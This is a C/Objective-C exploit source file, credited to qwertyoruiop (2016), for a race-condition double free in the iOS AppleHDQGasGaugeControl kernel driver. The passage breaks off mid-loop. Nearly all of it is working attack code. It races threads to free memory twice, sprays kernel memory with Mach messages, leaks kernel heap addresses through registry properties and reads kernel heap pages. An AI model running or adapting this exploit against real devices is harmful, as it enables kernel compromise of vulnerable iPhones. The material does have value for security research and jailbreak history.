/* 
 
    GasGauge race condition yielding double free

        (c) 2016 qwertyoruiop
 
    greetz: banty (this one is for you!) / filippobiga / windknown / morpheus / cturt / laughing_mantis / p0sixninja / osxreverser / trimo / beist / sn0w

    by Kim Jong Cracks Research (please CVE it to them!)
 
 */


#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <sys/ptrace.h>
#import <libkern/OSAtomic.h>


static     mach_port_t masterPort = 0;

extern "C" kern_return_t io_service_open_extended
(
	mach_port_t service,
	task_t owningTask,
	uint32_t connect_type,
	NDR_record_t ndr,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result,
	mach_port_t *connection
 );


__unused static void prioritize (int n) {
    struct thread_time_constraint_policy ttcpolicy;
    struct thread_precedence_policy prpolicy;
    prpolicy.importance = 0x70000000;
    
    thread_port_t threadport = pthread_mach_thread_np(pthread_self());
    
    ttcpolicy.period=100000; // HZ/160
    ttcpolicy.computation=10000; // HZ/3300;
    ttcpolicy.constraint=50000; // HZ/2200;
    ttcpolicy.preemptible=n;
    assert(0 == thread_policy_set(threadport,
                      THREAD_TIME_CONSTRAINT_POLICY, (thread_policy_t)&ttcpolicy,
                      THREAD_TIME_CONSTRAINT_POLICY_COUNT));
}
__unused static inline void lock(volatile int *exclusion)
{
    while (__sync_lock_test_and_set(exclusion, 1))
        while (*exclusion)
            ;
}
__unused static inline void unlock(volatile int *exclusion) {
    __sync_synchronize(); // Memory barrier.
    *exclusion = 0;
}


#define __lock OSSpinLockLock
#define __unlock OSSpinLockUnlock
//#undef OS_SPINLOCK_INIT
//#define OS_SPINLOCK_INIT 0
int la = OS_SPINLOCK_INIT;
int lb = OS_SPINLOCK_INIT;
extern "C" kern_return_t io_connect_method_scalarI_scalarO(
                                                           io_connect_t conn, uint32_t selector,
                                                           io_scalar_inband64_t scalar_input,
                                                           mach_msg_type_number_t scalar_inputCnt,
                                                           io_struct_inband_t inband_output,
                                                           mach_msg_type_number_t *inband_outputCnt
                                                           );


io_connect_t conn;
int c = OS_SPINLOCK_INIT;
int machm = OS_SPINLOCK_INIT;


typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc[32];
    mach_msg_trailer_t trailer;
} oolmsg_jumbo_t;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc[1];
    mach_msg_trailer_t trailer;
} oolmsg_t;
mach_port_t th1port = 0;
int32_t go = 0;
__attribute__((always_inline)) static inline
__unused void send_kern_data(char* vz, size_t svz, mach_port_t* msgp) {
    oolmsg_t *msg=(oolmsg_t *)alloca(sizeof(oolmsg_t)+0x2000);
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc[0].address = (void *)vz;
    msg->desc[0].size = svz;
    msg->desc[0].type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
}
__attribute__((always_inline)) static inline
__unused char* read_kern_data(mach_port_t port) {
    oolmsg_t *msg=(oolmsg_t *)alloca(sizeof(oolmsg_t)+0x2000);
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, (port), 0, MACH_PORT_NULL);
    return (char*)msg->desc[0].address;
}
__unused void drop_kern_data(mach_port_t port) {
    oolmsg_t *msg=(oolmsg_t *)alloca(sizeof(oolmsg_t)+0x2000);
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, (port), 0, MACH_PORT_NULL);
    vm_deallocate(mach_task_self(), (vm_address_t) msg->desc[0].address,msg->desc[0].size);
}

char ppad[0x10000];
#import <sys/event.h>
void pwn_this_bitch(mach_port_t a, mach_port_t b) {
    
    static uint64_t heap_leak_ptr = 0;
    static io_connect_t heap_leak_conn = 0;
    static char* heap_leak = 0;
    char mmsg[0x300];
    oolmsg_t* msg = (oolmsg_t*)mmsg;
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, a, 1000, MACH_PORT_NULL);
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    
    msg->header.msgh_remote_port = a;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    assert(*(uint32_t*)(msg->desc[0].address) == 0x13371337);
    
    kern_return_t err;
    io_iterator_t iterator;
    IOServiceGetMatchingServices(masterPort, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
    io_service_t gg = IOIteratorNext(iterator);

    
    char* bf = (char*) "<dict><key>1</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>2</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>3</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>4</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>5</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>6</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>7</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>8</key><data>AwAAAO++rd4AAAAAAAAAAFABAAAAAAAA/v4xQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data><key>step1</key><data></data></dict>";
    
    io_connect_t cnn=0;
    
    mach_port_t spray;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray);
    mach_port_insert_right(mach_task_self(), spray, spray, MACH_MSG_TYPE_MAKE_SEND);
    msg->header.msgh_remote_port = spray;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    
    usleep(10);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, b, 1000, MACH_PORT_NULL);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, spray, 1000, MACH_PORT_NULL);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, spray, 1000, MACH_PORT_NULL);
    io_service_open_extended(gg, mach_task_self(), 0, NDR_record, bf, strlen(bf)+1, &err, &cnn);
    if(cnn == 0) {
        return;
    }

    __unused uint64_t n[10] = {0};

    if (!heap_leak_ptr) {
        io_object_t obj=0;
        io_iterator_t iter;
        io_connect_t smashconn = 0;

        usleep(10);
        mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, a, 1000, MACH_PORT_NULL);
        io_service_open_extended(gg, mach_task_self(), 0, NDR_record, 0, 0, &err, &smashconn);
        NSLog(@"conn %d", smashconn);
        assert(smashconn);
        
        IORegistryEntryCreateIterator(gg, "IOService", kIORegistryIterateRecursively, &iter);
        io_object_t object = IOIteratorNext(iter);
        assert(object);
        char search_str[100] = {0};
        sprintf(search_str, "pid %d", getpid());
        while (object != 0)
        {
            char buffer[4096] = {0};
            uint32_t size = sizeof(buffer);
            if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buffer, &size) == 0)
            {
                if (strstr(buffer, search_str) != NULL)
                {
                    if (IORegistryEntryGetProperty(object, "step1", buffer, &size) == 0)
                    {
                         obj = object;
                        break;
                    }
                }
            }
            IOObjectRelease(object);
            
            object = IOIteratorNext(iter);
        }
        
        assert(obj);
        for (int i = 0; i < 8; i++) {
            char sbuffer[4096] = {0};
            uint32_t ssize = sizeof(sbuffer);
            char z[4] = {0};
            sprintf(z, "%d", i);
            if (IORegistryEntryGetProperty(obj, z, sbuffer, &ssize) == 0)
            {
                if (*(uint32_t*)(sbuffer) != 0x3) {
                    NSLog(@"[redacted] allocated buffer at %016llx (%d bytes)"/*,*(uint64_t*)(sbuffer)*/,*(uint64_t*)(sbuffer+0x128),*(uint32_t*)(sbuffer+0x120) * 8);
                    sync();
		    char buf[8192];
                    bzero(buf,8192);
                    for (int i = 0; i < 4096/8; i++) {
                        *(uint32_t *)&buf[4 + (i*8)] = 1;
                    }
                    *(uint32_t *)&buf[4+(4096-8)] = 0xFFFFFFFF;  // indicate end
                    
                    assert(IOConnectCallMethod(smashconn, 12, n, 1, buf, 4096, 0, 0, 0, 0) == 0);
                    IORegistryEntryGetProperty(obj, z, sbuffer, &ssize);
                    NSLog(@"[redacted] allocated buffer at %016llx (%d bytes)"/*,*(uint64_t*)(sbuffer)*/,*(uint64_t*)(sbuffer+0x128),*(uint32_t*)(sbuffer+0x120) * 8);
                    sync();
                    heap_leak = (char*)malloc(ssize);
                    memcpy(heap_leak, sbuffer, ssize);
                    heap_leak_conn = smashconn;
                    heap_leak_ptr = *(uint64_t*)(sbuffer+0x128);
                    break;
                }
            }
        }
        NSLog(@"step 1?");
        sleep(5);
    } else {
        
        char buf[8192];
        bzero(buf,8192);
        for (int i = 0; i < 0x168/8; i++) {
            *(uint32_t *)&buf[4 + (i*8)] = 1;
        }
        *(uint32_t *)&buf[4+(0x168-8)] = 0xFFFFFFFF;  // indicate end
        
        

        
        
        io_connect_t holder = 0;
        
        usleep(10);
        mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, a, 1000, MACH_PORT_NULL);
        io_service_open_extended(gg, mach_task_self(), 0, NDR_record, 0, 0, &err, &holder);

        mach_port_t pt[128];
        
        IOServiceClose(cnn);
        assert(IOConnectCallMethod(cnn, 12, n, 1, buf, 4096, 0, 0, 0, 0) != 0);

        for (int i = 0; i < 128; i++) {
            pt[i] = 0;
            send_kern_data(ppad,0x150,&pt[i]);
        }
        
        static char step = 0;
        if (step == 0) {
            *(uint32_t*)(heap_leak+0x120) = 2048 / 8;
            *(uint32_t*)(heap_leak+0x128) = heap_leak_ptr + 2048;
            step = 1;
        }
        NSString* bd = [[NSData dataWithBytes: heap_leak length: 0x168] base64EncodedStringWithOptions:0];
        
        char* bf = (char*) [[NSString stringWithFormat:@"<dict><key>1</key><data>%@</data><key>2</key><data>%@</data><key>3</key><data>%@</data><key>4</key><data>%@</data><key>5</key><data>%@</data><key>6</key><data>%@</data><key>7</key><data>%@</data><key>8</key><data>%@</data><key>step1</key><data></data></dict>",bd,bd,bd,bd,bd,bd,bd,bd] UTF8String];
        
        for (int i = 0; i < 128; i++) {
            mach_port_t ptz[2];
            send_kern_data(ppad,0x150,&ptz[0]);
            send_kern_data(ppad,0x150,&ptz[1]);
            drop_kern_data(pt[i]);
            drop_kern_data(ptz[0]);
            drop_kern_data(ptz[1]);
            io_connect_t ff=0;
            io_service_open_extended(gg, mach_task_self(), 0, NDR_record, bf, strlen(bf)+1, &err, &ff);
            assert(ff);
        }
        
        assert(IOConnectCallMethod(holder, 12, n, 1, buf, 4096, 0, 0, 0, 0) != 0);

        static mach_port_t magic_ports[4];
        
        usleep(1000);
        io_connect_method_scalarI_scalarO(holder, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
        send_kern_data(ppad, *(uint32_t*)(heap_leak+0x120) * 8 - 0x18, &magic_ports[step - 1]);
        
      //  io_connect_method_scalarI_scalarO(heap_leak_conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);

        if (step == 1) {
            NSLog(@"Successful!");

                    sync();
            char page[4096];
            *(uint64_t*)(&page[2048]) = 0x3;
            *(uint64_t*)(&page[2048+8]) = 0;
            *(uint64_t*)(&page[2048+16]) = 2048 - 0x18;
            
            
            usleep(100);
            io_connect_method_scalarI_scalarO(heap_leak_conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
            send_kern_data(&page[0x18], 4096-0x18, &magic_ports[3]);
            
            drop_kern_data(magic_ports[0]);
            
            usleep(100);
            char* kb = read_kern_data(magic_ports[3]);
            send_kern_data(kb, 4096-0x18, &magic_ports[3]);

            NSLog(@"leaked kernel heap page %@", [NSData dataWithBytes: kb length: 4096-0x18]);
                    sync();

            while (1) {
                sleep(100);
            }
        }

    }
}
mach_port_t th1port_a,th1port_b,th1port_c;

void thr() {
    thread_affinity_policy_data_t policyData2 = { 1 };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY, (thread_policy_t)&policyData2, 1);

    __unused uint64_t n[10] = {0,0,0,0,0,0,0,0,0,0};

    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    char pad[0x1000];
    char mmsg[0x300];
    char aaa[0x300];
    oolmsg_t* msg = (oolmsg_t*)mmsg;
    oolmsg_t* mzg = (oolmsg_t*)aaa;
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    memcpy(mzg,mmsg,sizeof(oolmsg_t));
    msg->body.msgh_descriptor_count = 1;
    for (int a = 0; a < msg->body.msgh_descriptor_count; a++) {
        msg->desc[a].address = (void *)(pad + (a*4));
        msg->desc[a].size = 0x168-0x18;
        msg->desc[a].type = MACH_MSG_OOL_DESCRIPTOR;
        *(uint32_t*)(msg->desc[a].address) = 0x41410000|a;
    }
    msg->header.msgh_local_port = MACH_PORT_NULL;
    memcpy(mzg,mmsg,sizeof(oolmsg_t));
    msg->header.msgh_remote_port = port;

    while (1) {
        prioritize(1);
        __unlock(&lb);
        __lock(&la);
        while (!go) {;;}
        go=0;
        *(uint32_t*)(msg->desc[0].address) = 0x41410000;
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
        volatile int lolz = 10000;
        while (lolz--) {
            ;;
        }
        io_connect_method_scalarI_scalarO(conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
        *(uint32_t*)(msg->desc[0].address) = 0x41410001;
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
        prioritize(0);

        __lock(&machm);
        *(uint32_t*)(msg->desc[0].address) = 0x41410002;
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
        for (int i = 0; i < 3; i++) {
            mach_port_t hport;
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &hport);
            mach_port_insert_right(mach_task_self(), hport, hport, MACH_MSG_TYPE_MAKE_SEND);
            msg->header.msgh_remote_port = hport;
            usleep(1);
            kern_return_t kn = mach_msg((mach_msg_header_t *)mzg, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, sizeof(oolmsg_t)+0x2000, port, 1000, MACH_PORT_NULL);
            *(uint32_t*)(msg->desc[0].address) = 0x13371337;
            mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
            if (kn == 0) {
                if (mzg->body.msgh_descriptor_count != msg->body.msgh_descriptor_count) {
                    NSLog(@"omg0 wtf");
                    sleep(5);
                }
                for (int a = 0; a < mzg->body.msgh_descriptor_count; a++) {
                    if (mzg->desc[a].address != 0) {
                        if (*(uint32_t*)(mzg->desc[a].address) != (0x41410000|i)) {
                            if ((*(uint32_t*)(mzg->desc[a].address) & 0xFFFF0000) != 0x42420000) {
                                NSLog(@"[?] found weird junk lol");
                            } else {
                                NSLog(@"[+] found %x expected %x // overlapped alloc; proceeding with pwnage", *(uint32_t*)(mzg->desc[a].address), (0x41410000|i));
                                mach_port_t overlap_a = hport, overlap_b;
                                
                                switch ((*(uint32_t*)(mzg->desc[a].address) & 0xF)) {
                                    case 0:
                                        overlap_b = th1port_a;
                                        break;
                                    case 1:
                                        overlap_b = th1port_b;
                                        break;
                                    case 2:
                                        overlap_b = th1port_c;
                                        break;
                                        
                                    default:
                                        overlap_b = 0;
                                        break;
                                }
                                pwn_this_bitch(overlap_a, overlap_b);
                            }
                        }
                        vm_deallocate(mach_task_self(), (vm_address_t)mzg->desc[a].address, mzg->desc[a].size);
                    } else {
                        NSLog(@"[?] wtf1");
                        sleep(5);
                    }
                    mzg->desc[a].address = 0;
                }
            } else {
                NSLog(@"[?] wtf2");
                sleep(5);
            }
            mach_port_deallocate(mach_task_self(), hport);
        }
        
        mach_port_deallocate(mach_task_self(), port);
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        msg->header.msgh_remote_port = port;

        __unlock(&lb);
        __lock(&la);


    }
}
void filler() {
    thread_affinity_policy_data_t policyData2 = { 2 };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY, (thread_policy_t)&policyData2, 1);
    prioritize(0);
    while (1) {
        ;;
    }
}
extern "C" kern_return_t io_connect_method
(
	mach_port_t connection,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	mach_vm_address_t ool_output,
	mach_vm_size_t *ool_output_size
 );

int main(int argc, char **argv, char **envp) {

    int f = open("/var/mobile/Media/yalu.log", O_RDWR|O_CREAT|O_APPEND, 0655);
    dup2(f,1); 
    dup2(f,2); 
    IOMasterPort(bootstrap_port, &masterPort);
    NSLog(@"qwertyoruiop[kjc]'s heap voodoo is taking over ur kernelz.. sit tight.");
    thread_affinity_policy_data_t policyData2 = { 1 };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY, (thread_policy_t)&policyData2, 1);
    kern_return_t err;
    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(masterPort, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
    io_service_t gg = IOIteratorNext(iterator);
    io_service_open_extended(gg, mach_task_self(), 0, NDR_record, 0, 0, &err, &conn);
    assert(err == KERN_SUCCESS);
    
    __unused uint64_t n[10] = {0,0,0,0,0,0,0,0,0,0};
    char buf[8192];
    bzero(buf,8192);
    for (int i = 0; i < 0x168/8; i++) {
        *(uint32_t *)&buf[4 + (i*8)] = 1;
    }
    *(uint32_t *)&buf[4+(0x168-8)] = 0xFFFFFFFF;  // indicate end
        
    assert(IOConnectCallMethod(conn, 12, n, 1, buf, 0x168, 0, 0, 0, 0) == 0);
    assert(IOConnectCallMethod(conn, 12, n, 1, buf, 0x168, 0, 0, 0, 0) != 0);
    io_connect_method_scalarI_scalarO(conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
    assert(IOConnectCallMethod(conn, 12, n, 1, buf, 0x168, 0, 0, 0, 0) == 0);
    io_connect_method_scalarI_scalarO(conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
    
    __lock(&machm);
    __lock(&la);
    __lock(&lb);

    pthread_t pt;
    pthread_create(&pt, 0, (void *(*)(void *))thr, 0);
    for (int i = 0; i < 8; i++) {
        pthread_create(&pt, 0, (void *(*)(void *))filler, 0);
    }
    
    prioritize(1);
    mach_port_t port_a,port_b,port_c;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_a);
    mach_port_insert_right(mach_task_self(), port_a, port_a, MACH_MSG_TYPE_MAKE_SEND);
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_b);
    mach_port_insert_right(mach_task_self(), port_b, port_b, MACH_MSG_TYPE_MAKE_SEND);
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_c);
    mach_port_insert_right(mach_task_self(), port_c, port_c, MACH_MSG_TYPE_MAKE_SEND);
    char pad[0x1000];
    char mmsg[0x300];
    oolmsg_t* msg = (oolmsg_t*)mmsg;
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    for (int a = 0; a < 1; a++) {
        msg->desc[a].address = (void *)(pad + (a*4));
        msg->desc[a].size = 0x168-0x18;
        msg->desc[a].type = MACH_MSG_OOL_DESCRIPTOR;
        *(uint32_t*)(msg->desc[a].address) = 0x42420000|a;
    }
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_remote_port = port_a;

    while (1) {
        n[1] = 0;
        assert(IOConnectCallMethod(conn, 12, n, 1, buf, 0x168, 0, 0, 0, 0) == 0);
        __lock(&lb);
        __unlock(&la);
        go = 1;
        io_connect_method_scalarI_scalarO(conn, 12, n, 1, (char*)n, (mach_msg_type_number_t*)&n[1]);
        mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
